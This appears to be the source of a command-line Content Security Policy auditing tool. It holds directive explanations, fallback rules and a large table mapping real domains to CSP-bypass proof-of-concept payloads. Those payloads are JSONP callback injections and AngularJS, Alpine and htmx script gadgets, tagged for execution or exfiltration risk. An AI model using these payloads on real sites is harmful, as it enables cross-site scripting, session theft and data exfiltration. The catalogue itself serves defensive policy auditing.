#!/usr/bin/env -S uv --quiet run --script
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "click<8.4",
#     "rich",
#     "tldextract",
#     "httpx",
#     "dnspython",
#     "python-whois",
# ]
# ///

from __future__ import annotations

import asyncio
import concurrent.futures
import ipaddress
import json
import re
import socket
import sys
import click
import tldextract
from dataclasses import dataclass, field
from enum import Enum
from functools import partial
from html.parser import HTMLParser
from string import Template
from typing import Any, Dict, List, Optional, Sequence, Set

import httpx
from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

try:
    from dns import resolver as _dns_resolver
    from dns.resolver import NXDOMAIN, NoAnswer, NoNameservers

    HAVE_DNSPY = True
except Exception:
    HAVE_DNSPY = False

try:
    from whois import whois as _whois_lookup  # type: ignore[import-not-found]
    from whois.exceptions import WhoisDomainNotFoundError  # type: ignore[import-not-found]

    HAVE_WHOIS = True
except Exception:
    HAVE_WHOIS = False

# ---------------------------------------
# Knowledge base
# ---------------------------------------

T_HELP: Dict[str, Dict[str, str]] = {
    # Fetch directives
    "child-src": {"text": "Workers/iframes (deprecated in CSP3; use frame-src + worker-src).", "color": "yellow"},
    "connect-src": {"text": "Restricts URLs loaded via script interfaces.", "color": "white"},
    "default-src": {"text": "Fallback for other fetch directives.", "color": "white"},
    "font-src": {"text": "Valid sources for @font-face.", "color": "white"},
    "frame-src": {"text": "Valid sources for iframes.", "color": "white"},
    "img-src": {"text": "Valid sources of images/favicons.", "color": "white"},
    "manifest-src": {"text": "Valid sources for web app manifests.", "color": "white"},
    "media-src": {"text": "Valid sources for audio/video/track.", "color": "white"},
    "object-src": {"text": "Valid sources for <object>/<embed>.", "color": "white"},
    "prefetch-src": {"text": "Valid sources to prefetch/prerender. (Deprecated)", "color": "yellow"},
    "script-src": {
        "text": "Valid sources for JavaScript and WebAssembly; fallback for script-src-elem and script-src-attr.",
        "color": "white",
    },
    "script-src-elem": {"text": "Valid sources for <script> elements only (not inline handlers).", "color": "white"},
    "script-src-attr": {"text": "Valid sources for inline JavaScript event handlers (e.g. onclick).", "color": "white"},
    "style-src": {
        "text": "Valid sources for stylesheets; fallback for style-src-elem and style-src-attr.",
        "color": "white",
    },
    "style-src-elem": {"text": 'Valid sources for <style> elements and <link rel="stylesheet">.', "color": "white"},
    "style-src-attr": {"text": "Valid sources for inline style attributes.", "color": "white"},
    "webrtc": {"text": "Allows or blocks WebRTC connections ('allow' / 'block').", "color": "white"},
    "webrtc-src": {"text": "Draft name for WebRTC sources; never standardised.", "color": "yellow"},
    "worker-src": {"text": "Valid sources for Worker/SharedWorker/ServiceWorker.", "color": "white"},
    # Document directives
    "base-uri": {"text": "Restricts URLs allowed in <base>.", "color": "white"},
    "plugin-types": {"text": "Legacy plugin resource types.", "color": "yellow"},
    "sandbox": {"text": "Enables a sandbox like the <iframe> attribute.", "color": "white"},
    "disown-opener": {"text": "Ensures a resource disowns its opener (legacy).", "color": "yellow"},
    # Navigation directives
    "form-action": {"text": "Restricts form action targets.", "color": "white"},
    "frame-ancestors": {"text": "Valid parents that may embed the page.", "color": "white"},
    "navigate-to": {"text": "Restricts where a document can navigate.", "color": "white"},
    # Reporting
    "report-uri": {"text": "Legacy violation report endpoint (prefer report-to).", "color": "yellow"},
    "report-to": {"text": "Reporting API group for CSP violations.", "color": "white"},
    # Other directives
    "block-all-mixed-content": {"text": "Disallow HTTP on HTTPS pages (deprecated).", "color": "yellow"},
    "referrer": {"text": "Deprecated. Use Referrer-Policy header.", "color": "yellow"},
    "require-sri-for": {"text": "Require SRI for scripts/styles.", "color": "white"},
    "require-trusted-types-for": {
        "text": "Enforces Trusted Types at DOM XSS sinks (requires 'script').",
        "color": "white",
    },
    "trusted-types": {
        "text": "Allowlist of Trusted Types policy names to prevent DOM XSS injection.",
        "color": "white",
    },
    "upgrade-insecure-requests": {"text": "Rewrite insecure URLs to HTTPS.", "color": "white"},
    # Experimental
    "fenced-frame-src": {"text": "Valid sources for <fencedframe> elements (experimental).", "color": "yellow"},
    "inline-speculation-rules": {
        "text": "Valid sources for inline speculation-rules scripts (experimental).",
        "color": "yellow",
    },
    # Source expressions — scheme sources
    "https:": {"text": "Allow all resources served over HTTPS.", "color": "yellow"},
    "http:": {"text": "Allow all resources served over HTTP (insecure).", "color": "red"},
    "data:": {"text": "Allow data: scheme (inline base64 data).", "color": "yellow"},
    "blob:": {"text": "Allow blob: object URLs.", "color": "yellow"},
    # Source expressions — keywords
    "*": {"text": "Wildcard; allows any origin (except data:/blob: and some schemes).", "color": "dark_orange"},
    "'none'": {"text": "No sources allowed; cannot be combined with other values.", "color": "green"},
    "'self'": {"text": "Same origin only (matching scheme, host, and port).", "color": "green"},
    "'unsafe-inline'": {"text": "Allow inline scripts/styles and event handlers; defeats much of CSP.", "color": "red"},
    "'unsafe-eval'": {"text": "Allow eval() and similar dynamic code execution APIs.", "color": "red"},
    "'unsafe-hashes'": {
        "text": "Allow inline event handlers matched by hash without requiring nonces.",
        "color": "red",
    },
    "'strict-dynamic'": {
        "text": "Propagate trust from a nonced/hashed script to scripts it loads dynamically.",
        "color": "yellow",
    },
    "'wasm-unsafe-eval'": {"text": "Allow WebAssembly execution without requiring 'unsafe-eval'.", "color": "yellow"},
    "'inline-speculation-rules'": {
        "text": 'Allow inline <script type="speculationrules"> without a nonce or hash.',
        "color": "yellow",
    },
    "'trusted-types-eval'": {
        "text": "Relax eval()/Function() restrictions when Trusted Types enforcement is active.",
        "color": "yellow",
    },
    "'report-sample'": {
        "text": "Include a code sample of the violating code in CSP violation reports.",
        "color": "white",
    },
    "'nonce-'": {"text": "Allow inline script/style whose nonce attribute matches the nonce value.", "color": "green"},
    "'sha256-'": {"text": "Allow inline script/style whose SHA-256 hash matches the given value.", "color": "green"},
    "'sha384-'": {"text": "Allow inline script/style whose SHA-384 hash matches the given value.", "color": "green"},
    "'sha512-'": {"text": "Allow inline script/style whose SHA-512 hash matches the given value.", "color": "green"},
}

DEPRECATED_OR_LEGACY = {
    "child-src",
    "plugin-types",
    "disown-opener",
    "block-all-mixed-content",
    "prefetch-src",
    "referrer",
    "report-uri",
    "reflected-xss",
    "webrtc-src",
}

# Every directive name the tool knows about. Derived from the help table so the
# two cannot drift apart: source expressions are quoted, schemes end in a colon
# and the wildcard is a single star, none of which is a directive name.
KNOWN_DIRECTIVES: Set[str] = {
    k for k in T_HELP if not k.startswith("'") and not k.endswith(":") and k != "*"
} | DEPRECATED_OR_LEGACY

# default-src is the fallback for the fetch directives only. Nothing falls back
# to these three, so leaving one out leaves it unrestricted no matter how strict
# the rest of the policy is.
NO_FALLBACK_DIRECTIVES = ("base-uri", "form-action", "frame-ancestors")

# Directives through which an allowed source can end up executing script.
SCRIPT_CAPABLE_DIRECTIVES = {"default-src", "script-src", "script-src-elem", "child-src", "worker-src"}

# Directives that fall back to default-src when absent.
FETCH_DIRECTIVES = {
    "child-src",
    "connect-src",
    "default-src",
    "fenced-frame-src",
    "font-src",
    "frame-src",
    "img-src",
    "manifest-src",
    "media-src",
    "object-src",
    "prefetch-src",
    "script-src",
    "script-src-attr",
    "script-src-elem",
    "style-src",
    "style-src-attr",
    "style-src-elem",
    "worker-src",
}

NONCE_AND_HASH_SOURCES = {"'nonce-'", "'sha256-'", "'sha384-'", "'sha512-'"}

# Keyword sources that allow no origin by themselves, so another policy cannot
# take anything away from them.
NON_GRANTING_KEYWORDS = {"'none'", "'strict-dynamic'", "'report-sample'"}

# Directives that fall back to a more general directive before default-src,
# most specific first.
FALLBACK_CHAIN: Dict[str, tuple] = {
    "script-src-elem": ("script-src", "default-src"),
    "script-src-attr": ("script-src", "default-src"),
    "style-src-elem": ("style-src", "default-src"),
    "style-src-attr": ("style-src", "default-src"),
    "frame-src": ("child-src", "default-src"),
    "worker-src": ("child-src", "default-src"),
}

BYPASS_DOMAINS: Dict[str, Dict] = {
    "7b936.v.fwmrm.net": {
        "risks": ["exec"],
        "pocs": ['<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script>'],
    },
    "a.config.skype.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=alert"></script>'
        ],
    },
    "a.huodong.mi.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>'],
    },
    "aax-us-east-retail-direct.amazon.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://aax-us-east-retail-direct.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>'
        ],
    },
    "abtasty.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://abtasty.com/wp-json?_jsonp=alert"></script>'],
    },
    "accdn.lpsnmedia.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>'
        ],
    },
    "accounts.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>'],
    },
    "acs.aliexpress.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>'
        ],
    },
    "acs.youku.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>'
        ],
    },
    "adhouse.pro": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://adhouse.pro/wp-json?_jsonp=alert"></script>'],
    },
    "admatic.com.tr": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://admatic.com.tr/wp-json?_jsonp=alert"></script>'],
    },
    "admixer.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://admixer.com/wp-json?_jsonp=alert"></script>'],
    },
    "adtelligent.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://adtelligent.com/wp-json?_jsonp=alert"></script>'],
    },
    "advangelists.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://advangelists.com/wp-json?_jsonp=alert"></script>'],
    },
    "advertising.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://advertising.com/wp-json?_jsonp=alert"></script>'],
    },
    "airbnb-api.arkoselabs.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://airbnb-api.arkoselabs.com/fc/a/?callback=alert"></script></body>'],
    },
    "ajax.googleapis.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "anchor.digitalocean.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>'
        ],
    },
    "api.bazaarvoice.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=alert"></script>'
        ],
    },
    "api.bing.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>'
        ],
    },
    "api.chartbeat.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.chartbeat.com/toppages/?jsonp=alert(1)-"></script>'],
    },
    "api.cxense.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.cxense.com/profile/user/segment?callback=alert"></script>'],
    },
    "api.dailymotion.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>'],
    },
    "api.duckduckgo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>'],
    },
    "api.flickr.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>'
        ],
    },
    "api.forismatic.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert(1)"></script>'
        ],
    },
    "api.getdrip.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>'],
    },
    "api.github.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.github.com/search/code?callback=alert"></script>'],
    },
    "api.ipify.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.ipify.org/?format=jsonp&callback=alert(1)//"></script>'],
    },
    "api.livechatinc.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.livechatinc.com/v3.6/customer/action/get_dynamic_configuration?license_id=x&url=x&channel_type=code&jsonp=alert"></script>'
        ],
    },
    "api.m.jd.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>'
        ],
    },
    "api.map.baidu.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>'],
    },
    "api.mixpanel.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>'],
    },
    "api.olark.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>'
        ],
    },
    "api.pinterest.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>'],
    },
    "api.stackexchange.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>'],
    },
    "api.swiftype.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>'
        ],
    },
    "api.tumblr.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>'
        ],
    },
    "api.twitter.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.twitter.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>'
        ],
    },
    "api.usabilla.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.usabilla.com/v2/feedback/c263014c1857.config?jsonp=alert"></script>'],
    },
    "api.vk.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>'],
    },
    "api.wordpress.org": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>'],
    },
    "api.x.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://api.x.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>'
        ],
    },
    "apis.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>',
            '<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>',
        ],
    },
    "app-sjint.marketo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>'],
    },
    "app.hushly.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://app.hushly.com/runtime/visitor?callback=alert(1)//"></script>'],
    },
    "app.link": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://app.link/_r?sdk=web&callback=alert"></script>'],
    },
    "appointlet.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://appointlet.com/wp-json?_jsonp=alert"></script>'],
    },
    "apps.bdimg.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "assets.grubhub.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "assets.guim.co.uk": {
        "risks": ["exec", "exfil"],
        "pocs": ["<script src=https://assets.guim.co.uk/polyfill.io/v3/polyfill.min.js?callback=alert></script>"],
    },
    "avada.io": {"risks": ["exec", "exfil"], "pocs": ['<script src="https://avada.io/wp-json?_jsonp=alert"></script>']},
    "bildirt.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://bildirt.com/wp-json?_jsonp=alert"></script>'],
    },
    "bookmark.hatenaapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>'],
    },
    "c.y.qq.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>'
        ],
    },
    "cas.criteo.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert"></script>'],
    },
    "cdn.arkoselabs.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cdn.arkoselabs.com/fc/a/?callback=alert"></script>'],
    },
    "cdn.bootcdn.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "cdn.bootcss.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.bootcss.com/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "cdn.jsdelivr.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.jsdelivr.net/combine/gh/moment/moment@develop/min/moment.min.js,gh/renniepak/xss/xss.js"></script>',
            '<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>',
            '<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">',
            '<script src="https://cdn.jsdelivr.net/npm/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">',
        ],
    },
    "cdn.shopify.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>'],
    },
    "cdn.staticfile.org": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdn.staticfile.org/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "cdn.syncfusion.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "cdnjs.cloudflare.com": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js"></script><div x-init="alert(1)">',
            '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">',
        ],
    },
    "challenges.cloudflare.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>'],
    },
    "client-api.arkoselabs.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>'],
    },
    "client.crisp.chat": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1)//"></script>'],
    },
    "clients1.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>'
        ],
    },
    "clients6.google.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>',
            '<script src="https://clients6.google.com/drive/v2internal/apps?openDrive=true&reason=301&syncType=0&errorRecovery=false&fields=kind%2CdefaultAppIds%2Citems%28kind%2Cid%2CuseByDefault%2Cname%2CopenUrlTemplate%2CprimaryMimeTypes%2CsecondaryMimeTypes%2CcreateUrl%2CcreateInFolderTemplate%2CobjectType%2CsupportsCreate%2CsupportsImport%2CsupportsMultiOpen%2CsupportsOfflineCreate%2Cinstalled%2Cauthorized%2CproductUrl%2CprimaryFileExtensions%2CsecondaryFileExtensions%2CshortDescription%2ClongDescription%2CproductId%2Cremovable%2Cicons%28iconUrl%2Csize%2Ccategory%29%2Ctype%2CchromeExtensionIds%2CrequiresAuthorizationBeforeOpenWith%2ChasDriveWideScope%2CdriveBranded%2CdriveSource%2CsupportsMobileBrowser%2CsupportsTeamDrives%2ChasGsmListing%29&languageCode=en&retryCount=0&dsNonce=cfgr2b5makyz&key=AIzaSyDLol3l87BBbfa-oQPI1b_5ymSTx8j30Ik&callback=alert(1)-1;"></script>',
        ],
    },
    "cloudinary.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cloudinary.com/wp-json?_jsonp=alert"></script>'],
    },
    "code.angularjs.org": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "commerce.coinbase.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>'],
    },
    "common.like.naver.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://common.like.naver.com/v1/search/contents?callback=alert&q=x"></script>'],
    },
    "connect.mail.ru": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>'],
    },
    "connectad.io": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://connectad.io/wp-json?_jsonp=alert"></script>'],
    },
    "content.akamai.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>'
        ],
    },
    "count-server.sharethis.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>'],
    },
    "cubepile.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://cubepile.com/wp-json?_jsonp=alert"></script>'],
    },
    "d.adroll.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>'
        ],
    },
    "d.la3-c2-ia5.salesforceliveagent.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://d.la3-c2-ia5.salesforceliveagent.com/chat/rest/EmbeddedService/EmbeddedServiceConfig.jsonp?org_id=00D40000000MvPv&EmbeddedServiceConfig.configName=Support_Brandfolder_Chat_Agents&callback=alert&version=48"></script>'
        ],
    },
    "d1xrp9zhb3ks3c.cloudfront.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "dable.io": {"risks": ["exec", "exfil"], "pocs": ['<script src="https://dable.io/wp-json?_jsonp=alert"></script>']},
    "dblp.org": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>'
        ],
    },
    "demandbase.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://demandbase.com/wp-json?_jsonp=alert"></script>'],
    },
    "demo.matomo.cloud": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=alert"></script>'
        ],
    },
    "dev.virtualearth.net": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>'
        ],
    },
    "documentation-resources.opendatasoft.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>'
        ],
    },
    "dpm.demdex.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://dpm.demdex.net/id?d_cb=alert"></script>'],
    },
    "dreamwater.com.tr": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://dreamwater.com.tr/wp-json?_jsonp=alert"></script>'],
    },
    "dynamic.criteo.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>'],
    },
    "elysiumwebsite.s3.amazonaws.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "eu.battle.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://eu.battle.net/support/update/json?callback=alert"></script>'],
    },
    "fast.wistia.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>'],
    },
    "firebase.googleapis.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://firebase.googleapis.com/v1alpha/projects/-/apps/1:789788471140:web:7e31b15959d68ac0a51471/webConfig?callback=alert(1)-1;"></script>'
        ],
    },
    "foremedia.net": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://foremedia.net/wp-json?_jsonp=alert"></script>'],
    },
    "forms.hsforms.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=alert"></script>'
        ],
    },
    "forms.hubspot.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>'
        ],
    },
    "g2.gumgum.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://g2.gumgum.com/hbid/imp?jsonp=alert(1)"></script>'],
    },
    "geolocation.onetrust.com": {
        "risks": ["exec"],
        "pocs": ['<script src="https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/alert"></script>'],
    },
    "gist.github.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>'
        ],
    },
    "global.apis.naver.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>'
        ],
    },
